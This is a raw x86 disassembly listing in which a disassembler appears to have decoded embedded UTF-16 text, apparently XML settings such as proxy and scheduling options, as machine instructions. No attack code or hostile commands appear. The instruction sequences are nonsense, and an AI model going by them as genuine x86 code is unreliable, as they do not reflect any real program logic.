  402d99:	jb     0x402e00
  402d9b:	cs inc esp
  402d9d:	jb     0x402e08
  402d9f:	jbe    0x402e06
  402da1:	jb     0x402dd1
  402da3:	inc    ebx
  402da4:	outs   dx,DWORD PTR ds:[esi]
  402da5:	jb     0x402e0c
  402da7:	add    BYTE PTR [edi+ebp*2+0x74],al
  402dab:	data16 jne 0x402e21
  402dae:	arpl   WORD PTR [ecx+0x74],sp
  402db1:	outs   dx,DWORD PTR ds:[esi]
  402db2:	jb     0x402df5
  402db4:	je     0x402e2a
  402db6:	jb     0x402e21
  402db8:	bound  esi,QWORD PTR [ebp+0x74]
  402dbb:	add    BYTE PTR gs:[esi+0x0],ah
  402dbf:	popa   
  402dc0:	add    BYTE PTR [ebx+0x0],ah
  402dc3:	bound  eax,QWORD PTR [eax]
  402dc5:	inc    ecx
  402dc6:	pop    edi
  402dc7:	xor    BYTE PTR [eax],al
  402dc9:	arpl   WORD PTR cs:[ebx+0x74],sp
  402dcd:	outs   dx,DWORD PTR ds:[esi]
  402dce:	jb     0x402dd0
  402dd0:	inc    ecx
  402dd1:	add    BYTE PTR [ebx+0x0],al
  402dd4:	inc    ebp
  402dd5:	popa   
  402dd6:	jae    0x402e3d
  402dd8:	ja     0x402e3b
  402dda:	jb     0x402e41
  402ddc:	cs inc ebx
  402dde:	outs   dx,DWORD PTR ds:[esi]
  402ddf:	outs   dx,BYTE PTR ds:[esi]
  402de0:	imul   sp,WORD PTR [edi+0x4c],0x6e61
  402de6:	addr16 jne 0x402e4a
  402de9:	addr16 gs inc esi
  402dec:	jb     0x402e5d
  402dee:	ins    DWORD PTR es:[edi],dx
  402def:	push   ebx
  402df0:	gs je  0x402e68
  402df3:	jo     0x402df5
  402df5:	add    BYTE PTR [eax],al
  402df7:	add    BYTE PTR [eax],al
  402df9:	or     DWORD PTR [eax+0x0],esi
  402dfc:	je     0x402dfe
  402dfe:	bound  eax,QWORD PTR [eax]
  402e00:	jb     0x402e02
  402e02:	add    BYTE PTR [ebx],cl
  402e04:	jo     0x402e06
  402e06:	je     0x402e08
  402e08:	sub    eax,0x52004200
  402e0d:	add    BYTE PTR [ecx],al
  402e0f:	pop    es
  402e10:	arpl   WORD PTR [eax],ax
  402e12:	push   0x7300
  402e17:	or     edi,DWORD PTR [edx+0x0]
  402e1a:	push   0x43002d00
  402e1f:	add    BYTE PTR [esi+0x0],cl
  402e22:	add    DWORD PTR ds:0x720067,eax
  402e28:	add    BYTE PTR [ebx],cl
  402e2a:	add    BYTE PTR gs:[eax+eax*1+0x2d],ch
  402e2f:	add    BYTE PTR [edi+0x0],al
  402e32:	push   edx
  402e33:	add    BYTE PTR [ecx],al
  402e35:	sub    edi,DWORD PTR [eax+eax*1]
  402e38:	aas    
  402e39:	add    BYTE PTR [eax+0x0],bh
  402e3c:	ins    DWORD PTR es:[edi],dx
  402e3d:	add    BYTE PTR [eax+eax*1+0x20],ch
  402e41:	add    BYTE PTR [esi+0x0],dh
  402e44:	add    BYTE PTR gs:[edx+0x0],dh
  402e48:	jae    0x402e4a
  402e4a:	imul   eax,DWORD PTR [eax],0x6e006f
  402e50:	cmp    eax,0x31002200
  402e55:	add    BYTE PTR [esi],ch
  402e57:	add    BYTE PTR [eax],dh
  402e59:	add    BYTE PTR [edx],ah
  402e5b:	add    BYTE PTR [edi],bh
  402e5d:	add    BYTE PTR [esi],bh
  402e5f:	add    BYTE PTR [eax],al
  402e61:	sbb    bl,0x3c
  402e64:	add    BYTE PTR [ebx+0x0],dl
  402e67:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  402e6c:	add    BYTE PTR [ecx+0x0],ch
  402e6f:	outs   dx,BYTE PTR ds:[esi]
  402e70:	add    BYTE PTR [edi+0x0],ah
  402e73:	jae    0x402e75
  402e75:	and    BYTE PTR [eax],al
  402e77:	js     0x402e79
  402e79:	ins    DWORD PTR es:[edi],dx
  402e7a:	add    BYTE PTR [eax+eax*1+0x6e],ch
  402e7e:	add    BYTE PTR [ebx+0x0],dh
  402e81:	cmp    al,BYTE PTR [eax]
  402e83:	js     0x402e85
  402e85:	jae    0x402e87
  402e87:	imul   eax,DWORD PTR [eax],0x22003d
  402e8d:	push   0x74007400
  402e92:	add    BYTE PTR [eax+0x0],dh
  402e95:	cmp    al,BYTE PTR [eax]
  402e97:	das    
  402e98:	add    BYTE PTR [edi],ch
  402e9a:	add    BYTE PTR [edi+0x0],dh
  402e9d:	ja     0x402e9f
  402e9f:	ja     0x402ea1
  402ea1:	add    BYTE PTR cs:[edi+0x0],dh
  402ea5:	xor    eax,DWORD PTR [eax]
  402ea7:	add    BYTE PTR cs:[edi+0x0],ch
  402eab:	jb     0x402ead
  402ead:	add    BYTE PTR [bx],ch
  402eb0:	add    BYTE PTR [edx],dh
  402eb2:	add    BYTE PTR [eax],dh
  402eb4:	add    BYTE PTR [eax],dh
  402eb6:	add    BYTE PTR [ecx],dh
  402eb8:	add    BYTE PTR [edi],ch
  402eba:	add    BYTE PTR [eax+0x0],bl
  402ebd:	dec    ebp
  402ebe:	add    BYTE PTR [eax+eax*1+0x53],cl
  402ec2:	add    BYTE PTR [ebx+0x0],ah
  402ec5:	push   0x6d006500
  402eca:	add    BYTE PTR [ecx+0x0],ah
  402ecd:	sub    eax,0x6e006900
  402ed2:	add    BYTE PTR [ebx+0x0],dh
  402ed5:	je     0x402ed7
  402ed7:	popa   
  402ed8:	add    BYTE PTR [esi+0x0],ch
  402edb:	arpl   WORD PTR [eax],ax
  402edd:	add    BYTE PTR gs:[edx],ah
  402ee0:	add    BYTE PTR [eax],ah
  402ee2:	add    BYTE PTR [eax+0x0],bh
  402ee5:	ins    DWORD PTR es:[edi],dx
  402ee6:	add    BYTE PTR [eax+eax*1+0x6e],ch
  402eea:	add    BYTE PTR [ebx+0x0],dh
  402eed:	cmp    al,BYTE PTR [eax]
  402eef:	js     0x402ef1
  402ef1:	jae    0x402ef3
  402ef3:	add    BYTE PTR fs:0x68002200,bh
  402efa:	add    BYTE PTR [eax+eax*1+0x74],dh
  402efe:	add    BYTE PTR [eax+0x0],dh
  402f01:	cmp    al,BYTE PTR [eax]
  402f03:	das    
  402f04:	add    BYTE PTR [edi],ch
  402f06:	add    BYTE PTR [edi+0x0],dh
  402f09:	ja     0x402f0b
  402f0b:	ja     0x402f0d
  402f0d:	add    BYTE PTR cs:[edi+0x0],dh
  402f11:	xor    eax,DWORD PTR [eax]
  402f13:	add    BYTE PTR cs:[edi+0x0],ch
  402f17:	jb     0x402f19
  402f19:	add    BYTE PTR [bx],ch
  402f1c:	add    BYTE PTR [edx],dh
  402f1e:	add    BYTE PTR [eax],dh
  402f20:	add    BYTE PTR [eax],dh
  402f22:	add    BYTE PTR [ecx],dh
  402f24:	add    BYTE PTR [edi],ch
  402f26:	add    BYTE PTR [eax+0x0],bl
  402f29:	dec    ebp
  402f2a:	add    BYTE PTR [eax+eax*1+0x53],cl
  402f2e:	add    BYTE PTR [ebx+0x0],ah
  402f31:	push   0x6d006500
  402f36:	add    BYTE PTR [ecx+0x0],ah
  402f39:	and    al,BYTE PTR [eax]
  402f3b:	add    BYTE PTR ds:[ecx],al
  402f3e:	dec    edi
  402f3f:	cmp    al,0x0
  402f41:	push   ebp
  402f42:	add    BYTE PTR [ebx+0x0],dh
  402f45:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  402f4a:	add    BYTE PTR [esi+0x0],ah
  402f4d:	popa   
  402f4e:	add    BYTE PTR [ebp+0x0],dh
  402f51:	ins    BYTE PTR es:[edi],dx
  402f52:	add    BYTE PTR [eax+eax*1+0x50],dh
  402f56:	add    BYTE PTR [edx+0x0],dh
  402f59:	outs   dx,DWORD PTR ds:[esi]
  402f5a:	add    BYTE PTR [eax+0x0],bh
  402f5d:	jns    0x402f5f
  402f5f:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  402f64:	add    BYTE PTR [ebp+0x0],dh
  402f67:	add    BYTE PTR gs:[eax+eax*1],bh
  402f6b:	das    
  402f6c:	add    BYTE PTR [ebp+0x0],dl
  402f6f:	jae    0x402f71
  402f71:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  402f76:	add    BYTE PTR [esi+0x0],ah
  402f79:	popa   
  402f7a:	add    BYTE PTR [ebp+0x0],dh
  402f7d:	ins    BYTE PTR es:[edi],dx
  402f7e:	add    BYTE PTR [eax+eax*1+0x50],dh
  402f82:	add    BYTE PTR [edx+0x0],dh
  402f85:	outs   dx,DWORD PTR ds:[esi]
  402f86:	add    BYTE PTR [eax+0x0],bh
  402f89:	jns    0x402f8b
  402f8b:	add    BYTE PTR ds:[eax],al
  402f8e:	push   ecx
  402f8f:	cmp    al,0x0
  402f91:	push   ebp
  402f92:	add    BYTE PTR [ebx+0x0],dh
  402f95:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  402f9a:	add    BYTE PTR [esi+0x0],ah
  402f9d:	popa   
  402f9e:	add    BYTE PTR [ebp+0x0],dh
  402fa1:	ins    BYTE PTR es:[edi],dx
  402fa2:	add    BYTE PTR [eax+eax*1+0x50],dh
  402fa6:	add    BYTE PTR [edx+0x0],dh
  402fa9:	outs   dx,DWORD PTR ds:[esi]
  402faa:	add    BYTE PTR [eax+0x0],bh
  402fad:	jns    0x402faf
  402faf:	add    BYTE PTR ds:[esi+0x0],ah
  402fb3:	popa   
  402fb4:	add    BYTE PTR [eax+eax*1+0x73],ch
  402fb8:	add    BYTE PTR [ebp+0x0],ah
  402fbb:	cmp    al,0x0
  402fbd:	das    
  402fbe:	add    BYTE PTR [ebp+0x0],dl
  402fc1:	jae    0x402fc3
  402fc3:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  402fc8:	add    BYTE PTR [esi+0x0],ah
  402fcb:	popa   
  402fcc:	add    BYTE PTR [ebp+0x0],dh
  402fcf:	ins    BYTE PTR es:[edi],dx
  402fd0:	add    BYTE PTR [eax+eax*1+0x50],dh
  402fd4:	add    BYTE PTR [edx+0x0],dh
  402fd7:	outs   dx,DWORD PTR ds:[esi]
  402fd8:	add    BYTE PTR [eax+0x0],bh
  402fdb:	jns    0x402fdd
  402fdd:	add    BYTE PTR ds:[eax],al
  402fe0:	pop    ds
  402fe1:	cmp    al,0x0
  402fe3:	push   eax
  402fe4:	add    BYTE PTR [edx+0x0],dh
  402fe7:	outs   dx,DWORD PTR ds:[esi]
  402fe8:	add    BYTE PTR [eax+0x0],bh
  402feb:	jns    0x402fed
  402fed:	push   ebx
  402fee:	add    BYTE PTR [ebp+0x0],ah
  402ff1:	jb     0x402ff3
  402ff3:	jbe    0x402ff5
  402ff5:	add    BYTE PTR gs:[edx+0x0],dh
  402ff9:	and    BYTE PTR [eax],al
  402ffb:	das    
  402ffc:	add    BYTE PTR [esi],bh
  402ffe:	add    BYTE PTR [eax],al
  403000:	sbb    edi,DWORD PTR [eax+eax*1]
  403003:	push   eax
  403004:	add    BYTE PTR [edx+0x0],dh
  403007:	outs   dx,DWORD PTR ds:[esi]
  403008:	add    BYTE PTR [eax+0x0],bh
  40300b:	jns    0x40300d
  40300d:	push   ebx
  40300e:	add    BYTE PTR [ebp+0x0],ah
  403011:	jb     0x403013
  403013:	jbe    0x403015
  403015:	add    BYTE PTR gs:[edx+0x0],dh
  403019:	add    BYTE PTR ds:[eax],al
  40301c:	sbb    eax,0x2f003c
  403021:	push   eax
  403022:	add    BYTE PTR [edx+0x0],dh
  403025:	outs   dx,DWORD PTR ds:[esi]
  403026:	add    BYTE PTR [eax+0x0],bh
  403029:	jns    0x40302b
  40302b:	push   ebx
  40302c:	add    BYTE PTR [ebp+0x0],ah
  40302f:	jb     0x403031
  403031:	jbe    0x403033
  403033:	add    BYTE PTR gs:[edx+0x0],dh
  403037:	add    BYTE PTR ds:[eax],al
  40303a:	pop    ss
  40303b:	cmp    al,0x0
  40303d:	push   eax
  40303e:	add    BYTE PTR [edx+0x0],dh
  403041:	outs   dx,DWORD PTR ds:[esi]
  403042:	add    BYTE PTR [eax+0x0],bh
  403045:	jns    0x403047
  403047:	push   eax
  403048:	add    BYTE PTR [edi+0x0],ch
  40304b:	jb     0x40304d
  40304d:	je     0x40304f
  40304f:	add    BYTE PTR ds:[eax],al
  403052:	sbb    DWORD PTR [eax+eax*1],edi
  403055:	das    
  403056:	add    BYTE PTR [eax+0x0],dl
  403059:	jb     0x40305b
  40305b:	outs   dx,DWORD PTR ds:[esi]
  40305c:	add    BYTE PTR [eax+0x0],bh
  40305f:	jns    0x403061
  403061:	push   eax
  403062:	add    BYTE PTR [edi+0x0],ch
  403065:	jb     0x403067
  403067:	je     0x403069
  403069:	add    BYTE PTR ds:[eax],al
  40306c:	sbb    edi,DWORD PTR [eax+eax*1]
  40306f:	push   eax
  403070:	add    BYTE PTR [edx+0x0],dh
  403073:	outs   dx,DWORD PTR ds:[esi]
  403074:	add    BYTE PTR [eax+0x0],bh
  403077:	jns    0x403079
  403079:	push   ebp
  40307a:	add    BYTE PTR [ebx+0x0],dh
  40307d:	add    BYTE PTR gs:[edx+0x0],dh
  403081:	and    BYTE PTR [eax],al
  403083:	das    
  403084:	add    BYTE PTR [esi],bh
  403086:	add    BYTE PTR [eax],al
  403088:	pop    ss
  403089:	cmp    al,0x0
  40308b:	push   eax
  40308c:	add    BYTE PTR [edx+0x0],dh
  40308f:	outs   dx,DWORD PTR ds:[esi]
  403090:	add    BYTE PTR [eax+0x0],bh
  403093:	jns    0x403095
  403095:	push   ebp
  403096:	add    BYTE PTR [ebx+0x0],dh
  403099:	add    BYTE PTR gs:[edx+0x0],dh
  40309d:	add    BYTE PTR ds:[eax],al
  4030a0:	sbb    DWORD PTR [eax+eax*1],edi
  4030a3:	das    
  4030a4:	add    BYTE PTR [eax+0x0],dl
  4030a7:	jb     0x4030a9
  4030a9:	outs   dx,DWORD PTR ds:[esi]
  4030aa:	add    BYTE PTR [eax+0x0],bh
  4030ad:	jns    0x4030af
  4030af:	push   ebp
  4030b0:	add    BYTE PTR [ebx+0x0],dh
  4030b3:	add    BYTE PTR gs:[edx+0x0],dh
  4030b7:	add    BYTE PTR ds:[eax],al
  4030ba:	and    edi,DWORD PTR [eax+eax*1]
  4030bd:	push   eax
  4030be:	add    BYTE PTR [edx+0x0],dh
  4030c1:	outs   dx,DWORD PTR ds:[esi]
  4030c2:	add    BYTE PTR [eax+0x0],bh
  4030c5:	jns    0x4030c7
  4030c7:	push   eax
  4030c8:	add    BYTE PTR [ecx+0x0],ah
  4030cb:	jae    0x4030cd
  4030cd:	jae    0x4030cf
  4030cf:	ja     0x4030d1
  4030d1:	outs   dx,DWORD PTR ds:[esi]
  4030d2:	add    BYTE PTR [edx+0x0],dh
  4030d5:	add    BYTE PTR fs:[eax],ah
  4030d8:	add    BYTE PTR [edi],ch
  4030da:	add    BYTE PTR [esi],bh
  4030dc:	add    BYTE PTR [eax],al
  4030de:	pop    ds
  4030df:	cmp    al,0x0
  4030e1:	push   eax
  4030e2:	add    BYTE PTR [edx+0x0],dh
  4030e5:	outs   dx,DWORD PTR ds:[esi]
  4030e6:	add    BYTE PTR [eax+0x0],bh
  4030e9:	jns    0x4030eb
  4030eb:	push   eax
  4030ec:	add    BYTE PTR [ecx+0x0],ah
  4030ef:	jae    0x4030f1
  4030f1:	jae    0x4030f3
  4030f3:	ja     0x4030f5
  4030f5:	outs   dx,DWORD PTR ds:[esi]
  4030f6:	add    BYTE PTR [edx+0x0],dh
  4030f9:	add    BYTE PTR fs:[esi],bh
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	and    DWORD PTR [eax+eax*1],edi
  403101:	das    
  403102:	add    BYTE PTR [eax+0x0],dl
  403105:	jb     0x403107
  403107:	outs   dx,DWORD PTR ds:[esi]
  403108:	add    BYTE PTR [eax+0x0],bh
  40310b:	jns    0x40310d
  40310d:	push   eax
  40310e:	add    BYTE PTR [ecx+0x0],ah
  403111:	jae    0x403113
  403113:	jae    0x403115
  403115:	ja     0x403117
  403117:	outs   dx,DWORD PTR ds:[esi]
  403118:	add    BYTE PTR [edx+0x0],dh
  40311b:	add    BYTE PTR fs:[esi],bh
  40311e:	add    BYTE PTR [eax],al
  403120:	arpl   WORD PTR [eax+eax*1],di
  403123:	inc    ecx
  403124:	add    BYTE PTR [ebp+0x0],dh
  403127:	je     0x403129
  403129:	outs   dx,DWORD PTR ds:[esi]
  40312a:	add    BYTE PTR [ebx+0x0],al
  40312d:	jb     0x40312f
  40312f:	add    BYTE PTR gs:[ecx+0x0],ah
  403133:	je     0x403135
  403135:	add    BYTE PTR gs:[ebx+0x0],dl
  403139:	je     0x40313b
  40313b:	outs   dx,DWORD PTR ds:[esi]
  40313c:	add    BYTE PTR [edx+0x0],dh
  40313f:	add    BYTE PTR gs:[eax+0x0],dl
  403143:	outs   dx,DWORD PTR ds:[esi]
  403144:	add    BYTE PTR [ecx+0x0],ch
  403147:	outs   dx,BYTE PTR ds:[esi]
  403148:	add    BYTE PTR [eax+eax*1+0x3e],dh
  40314c:	add    BYTE PTR [eax+eax*1+0x72],dh
  403150:	add    BYTE PTR [ebp+0x0],dh
  403153:	add    BYTE PTR gs:[eax+eax*1],bh
  403157:	das    
  403158:	add    BYTE PTR [ecx+0x0],al
  40315b:	jne    0x40315d
  40315d:	je     0x40315f
  40315f:	outs   dx,DWORD PTR ds:[esi]
  403160:	add    BYTE PTR [ebx+0x0],al
  403163:	jb     0x403165
  403165:	add    BYTE PTR gs:[ecx+0x0],ah
  403169:	je     0x40316b
  40316b:	add    BYTE PTR gs:[ebx+0x0],dl
  40316f:	je     0x403171
  403171:	outs   dx,DWORD PTR ds:[esi]
  403172:	add    BYTE PTR [edx+0x0],dh
  403175:	add    BYTE PTR gs:[eax+0x0],dl
  403179:	outs   dx,DWORD PTR ds:[esi]
  40317a:	add    BYTE PTR [ecx+0x0],ch
  40317d:	outs   dx,BYTE PTR ds:[esi]
  40317e:	add    BYTE PTR [eax+eax*1+0x3e],dh
  403182:	add    BYTE PTR [eax],al
  403184:	gs cmp al,0x0
  403187:	inc    ecx
  403188:	add    BYTE PTR [ebp+0x0],dh
  40318b:	je     0x40318d
  40318d:	outs   dx,DWORD PTR ds:[esi]
  40318e:	add    BYTE PTR [ebx+0x0],al
  403191:	jb     0x403193
  403193:	add    BYTE PTR gs:[ecx+0x0],ah
  403197:	je     0x403199
  403199:	add    BYTE PTR gs:[ebx+0x0],dl
  40319d:	je     0x40319f
  40319f:	outs   dx,DWORD PTR ds:[esi]
  4031a0:	add    BYTE PTR [edx+0x0],dh
  4031a3:	add    BYTE PTR gs:[eax+0x0],dl
  4031a7:	outs   dx,DWORD PTR ds:[esi]
  4031a8:	add    BYTE PTR [ecx+0x0],ch
  4031ab:	outs   dx,BYTE PTR ds:[esi]
  4031ac:	add    BYTE PTR [eax+eax*1+0x3e],dh
  4031b0:	add    BYTE PTR [esi+0x0],ah
  4031b3:	popa   
  4031b4:	add    BYTE PTR [eax+eax*1+0x73],ch
  4031b8:	add    BYTE PTR [ebp+0x0],ah
  4031bb:	cmp    al,0x0
  4031bd:	das    
  4031be:	add    BYTE PTR [ecx+0x0],al
  4031c1:	jne    0x4031c3
  4031c3:	je     0x4031c5
  4031c5:	outs   dx,DWORD PTR ds:[esi]
  4031c6:	add    BYTE PTR [ebx+0x0],al
  4031c9:	jb     0x4031cb
  4031cb:	add    BYTE PTR gs:[ecx+0x0],ah
  4031cf:	je     0x4031d1
  4031d1:	add    BYTE PTR gs:[ebx+0x0],dl
  4031d5:	je     0x4031d7
  4031d7:	outs   dx,DWORD PTR ds:[esi]
  4031d8:	add    BYTE PTR [edx+0x0],dh
  4031db:	add    BYTE PTR gs:[eax+0x0],dl
  4031df:	outs   dx,DWORD PTR ds:[esi]
  4031e0:	add    BYTE PTR [ecx+0x0],ch
  4031e3:	outs   dx,BYTE PTR ds:[esi]
  4031e4:	add    BYTE PTR [eax+eax*1+0x3e],dh
  4031e8:	add    BYTE PTR [eax],al
  4031ea:	inc    ebx
  4031eb:	cmp    al,0x0
  4031ed:	inc    ebx
  4031ee:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4031f2:	add    BYTE PTR [ebx+0x0],dh
  4031f5:	add    BYTE PTR gs:[ebx+0x0],al
  4031f9:	outs   dx,DWORD PTR ds:[esi]
  4031fa:	add    BYTE PTR [esi+0x0],ch
  4031fd:	data16 add BYTE PTR [ecx+0x0],ch
  403201:	jb     0x403203
  403203:	ins    DWORD PTR es:[edi],dx
  403204:	add    BYTE PTR [esi],bh
  403206:	add    BYTE PTR [eax+eax*1+0x72],dh
  40320a:	add    BYTE PTR [ebp+0x0],dh
  40320d:	add    BYTE PTR gs:[eax+eax*1],bh
  403211:	das    
  403212:	add    BYTE PTR [ebx+0x0],al
  403215:	ins    BYTE PTR es:[edi],dx
  403216:	add    BYTE PTR [edi+0x0],ch
  403219:	jae    0x40321b
  40321b:	add    BYTE PTR gs:[ebx+0x0],al
  40321f:	outs   dx,DWORD PTR ds:[esi]
  403220:	add    BYTE PTR [esi+0x0],ch
  403223:	data16 add BYTE PTR [ecx+0x0],ch
  403227:	jb     0x403229
  403229:	ins    DWORD PTR es:[edi],dx
  40322a:	add    BYTE PTR [esi],bh
  40322c:	add    BYTE PTR [eax],al
  40322e:	inc    ebp
  40322f:	cmp    al,0x0
  403231:	inc    ebx
  403232:	add    BYTE PTR [eax+eax*1+0x6f],ch
  403236:	add    BYTE PTR [ebx+0x0],dh
  403239:	add    BYTE PTR gs:[ebx+0x0],al
  40323d:	outs   dx,DWORD PTR ds:[esi]
  40323e:	add    BYTE PTR [esi+0x0],ch
  403241:	data16 add BYTE PTR [ecx+0x0],ch
  403245:	jb     0x403247
  403247:	ins    DWORD PTR es:[edi],dx
  403248:	add    BYTE PTR [esi],bh
  40324a:	add    BYTE PTR [esi+0x0],ah
  40324d:	popa   
  40324e:	add    BYTE PTR [eax+eax*1+0x73],ch
  403252:	add    BYTE PTR [ebp+0x0],ah
  403255:	cmp    al,0x0
  403257:	das    
  403258:	add    BYTE PTR [ebx+0x0],al
  40325b:	ins    BYTE PTR es:[edi],dx
  40325c:	add    BYTE PTR [edi+0x0],ch
  40325f:	jae    0x403261
  403261:	add    BYTE PTR gs:[ebx+0x0],al
  403265:	outs   dx,DWORD PTR ds:[esi]
  403266:	add    BYTE PTR [esi+0x0],ch
  403269:	data16 add BYTE PTR [ecx+0x0],ch
  40326d:	jb     0x40326f
  40326f:	ins    DWORD PTR es:[edi],dx
  403270:	add    BYTE PTR [esi],bh
  403272:	add    BYTE PTR [eax],al
  403274:	aas    
  403275:	cmp    al,0x0
  403277:	inc    ebx
  403278:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40327c:	add    BYTE PTR [ebx+0x0],dh
  40327f:	add    BYTE PTR gs:[eax+eax*1+0x6f],dl
  403284:	add    BYTE PTR [eax+eax*1+0x72],dl
  403288:	add    BYTE PTR [ecx+0x0],ah
  40328b:	jns    0x40328d
  40328d:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  403292:	add    BYTE PTR [ebp+0x0],dh
  403295:	add    BYTE PTR gs:[eax+eax*1],bh
  403299:	das    
  40329a:	add    BYTE PTR [ebx+0x0],al
  40329d:	ins    BYTE PTR es:[edi],dx
  40329e:	add    BYTE PTR [edi+0x0],ch
  4032a1:	jae    0x4032a3
  4032a3:	add    BYTE PTR gs:[eax+eax*1+0x6f],dl
  4032a8:	add    BYTE PTR [eax+eax*1+0x72],dl
  4032ac:	add    BYTE PTR [ecx+0x0],ah
  4032af:	jns    0x4032b1
  4032b1:	add    BYTE PTR ds:[eax],al
  4032b4:	inc    ecx
  4032b5:	cmp    al,0x0
  4032b7:	inc    ebx
  4032b8:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4032bc:	add    BYTE PTR [ebx+0x0],dh
  4032bf:	add    BYTE PTR gs:[eax+eax*1+0x6f],dl
  4032c4:	add    BYTE PTR [eax+eax*1+0x72],dl
  4032c8:	add    BYTE PTR [ecx+0x0],ah
  4032cb:	jns    0x4032cd
  4032cd:	add    BYTE PTR ds:[esi+0x0],ah
  4032d1:	popa   
  4032d2:	add    BYTE PTR [eax+eax*1+0x73],ch
  4032d6:	add    BYTE PTR [ebp+0x0],ah
  4032d9:	cmp    al,0x0
  4032db:	das    
  4032dc:	add    BYTE PTR [ebx+0x0],al
  4032df:	ins    BYTE PTR es:[edi],dx
  4032e0:	add    BYTE PTR [edi+0x0],ch
  4032e3:	jae    0x4032e5
  4032e5:	add    BYTE PTR gs:[eax+eax*1+0x6f],dl
  4032ea:	add    BYTE PTR [eax+eax*1+0x72],dl
  4032ee:	add    BYTE PTR [ecx+0x0],ah
  4032f1:	jns    0x4032f3
  4032f3:	add    BYTE PTR ds:[eax],al
  4032f6:	inc    ebx
  4032f7:	cmp    al,0x0
  4032f9:	push   ebx
  4032fa:	add    BYTE PTR [ebx+0x0],ah
  4032fd:	push   0x64006500
  403302:	add    BYTE PTR [ebp+0x0],dh
  403305:	ins    BYTE PTR es:[edi],dx
  403306:	add    BYTE PTR [ebp+0x0],ah
  403309:	push   ebx
  40330a:	add    BYTE PTR [ebx+0x0],ah
  40330d:	popa   
  40330e:	add    BYTE PTR [esi+0x0],ch
  403311:	add    BYTE PTR ds:[eax+eax*1+0x72],dh
  403316:	add    BYTE PTR [ebp+0x0],dh
  403319:	add    BYTE PTR gs:[eax+eax*1],bh
  40331d:	das    
  40331e:	add    BYTE PTR [ebx+0x0],dl
  403321:	arpl   WORD PTR [eax],ax
  403323:	push   0x64006500
  403328:	add    BYTE PTR [ebp+0x0],dh
  40332b:	ins    BYTE PTR es:[edi],dx
  40332c:	add    BYTE PTR [ebp+0x0],ah
  40332f:	push   ebx
  403330:	add    BYTE PTR [ebx+0x0],ah
  403333:	popa   
  403334:	add    BYTE PTR [esi+0x0],ch
  403337:	add    BYTE PTR ds:[eax],al
  40333a:	inc    ebp
  40333b:	cmp    al,0x0
  40333d:	push   ebx
  40333e:	add    BYTE PTR [ebx+0x0],ah
  403341:	push   0x64006500
  403346:	add    BYTE PTR [ebp+0x0],dh
  403349:	ins    BYTE PTR es:[edi],dx
  40334a:	add    BYTE PTR [ebp+0x0],ah
  40334d:	push   ebx
  40334e:	add    BYTE PTR [ebx+0x0],ah
  403351:	popa   
  403352:	add    BYTE PTR [esi+0x0],ch
  403355:	add    BYTE PTR ds:[esi+0x0],ah
  403359:	popa   
  40335a:	add    BYTE PTR [eax+eax*1+0x73],ch
  40335e:	add    BYTE PTR [ebp+0x0],ah
  403361:	cmp    al,0x0
  403363:	das    
  403364:	add    BYTE PTR [ebx+0x0],dl
  403367:	arpl   WORD PTR [eax],ax
  403369:	push   0x64006500
  40336e:	add    BYTE PTR [ebp+0x0],dh
  403371:	ins    BYTE PTR es:[edi],dx
  403372:	add    BYTE PTR [ebp+0x0],ah
  403375:	push   ebx
  403376:	add    BYTE PTR [ebx+0x0],ah
  403379:	popa   
  40337a:	add    BYTE PTR [esi+0x0],ch
  40337d:	add    BYTE PTR ds:[eax],al
  403380:	pop    ebx
  403381:	cmp    al,0x0
  403383:	push   ebp
  403384:	add    BYTE PTR [eax+0x0],dh
  403387:	ins    BYTE PTR es:[edi],dx
  403388:	add    BYTE PTR [edi+0x0],ch
  40338b:	popa   
  40338c:	add    BYTE PTR [eax+eax*1+0x48],ah
  403390:	add    BYTE PTR [ecx+0x0],ah
  403393:	jb     0x403395
  403395:	add    BYTE PTR fs:[edi+0x0],dh
  403399:	popa   
  40339a:	add    BYTE PTR [edx+0x0],dh
  40339d:	add    BYTE PTR gs:[ecx+0x0],cl
  4033a1:	outs   dx,BYTE PTR ds:[esi]
  4033a2:	add    BYTE PTR [esi+0x0],ah
  4033a5:	outs   dx,DWORD PTR ds:[esi]
  4033a6:	add    BYTE PTR [esi],bh
  4033a8:	add    BYTE PTR [eax+eax*1+0x72],dh
  4033ac:	add    BYTE PTR [ebp+0x0],dh
  4033af:	add    BYTE PTR gs:[eax+eax*1],bh
  4033b3:	das    
  4033b4:	add    BYTE PTR [ebp+0x0],dl
  4033b7:	jo     0x4033b9
  4033b9:	ins    BYTE PTR es:[edi],dx
  4033ba:	add    BYTE PTR [edi+0x0],ch
  4033bd:	popa   
  4033be:	add    BYTE PTR [eax+eax*1+0x48],ah
  4033c2:	add    BYTE PTR [ecx+0x0],ah
  4033c5:	jb     0x4033c7
  4033c7:	add    BYTE PTR fs:[edi+0x0],dh
  4033cb:	popa   
  4033cc:	add    BYTE PTR [edx+0x0],dh
  4033cf:	add    BYTE PTR gs:[ecx+0x0],cl
  4033d3:	outs   dx,BYTE PTR ds:[esi]
  4033d4:	add    BYTE PTR [esi+0x0],ah
  4033d7:	outs   dx,DWORD PTR ds:[esi]
  4033d8:	add    BYTE PTR [esi],bh
  4033da:	add    BYTE PTR [eax],al
  4033dc:	pop    ebp
  4033dd:	cmp    al,0x0
  4033df:	push   ebp
  4033e0:	add    BYTE PTR [eax+0x0],dh
  4033e3:	ins    BYTE PTR es:[edi],dx
  4033e4:	add    BYTE PTR [edi+0x0],ch
  4033e7:	popa   
  4033e8:	add    BYTE PTR [eax+eax*1+0x48],ah
  4033ec:	add    BYTE PTR [ecx+0x0],ah
  4033ef:	jb     0x4033f1
  4033f1:	add    BYTE PTR fs:[edi+0x0],dh
  4033f5:	popa   
  4033f6:	add    BYTE PTR [edx+0x0],dh
  4033f9:	add    BYTE PTR gs:[ecx+0x0],cl
  4033fd:	outs   dx,BYTE PTR ds:[esi]
  4033fe:	add    BYTE PTR [esi+0x0],ah
  403401:	outs   dx,DWORD PTR ds:[esi]
  403402:	add    BYTE PTR [esi],bh
  403404:	add    BYTE PTR [esi+0x0],ah
  403407:	popa   
  403408:	add    BYTE PTR [eax+eax*1+0x73],ch
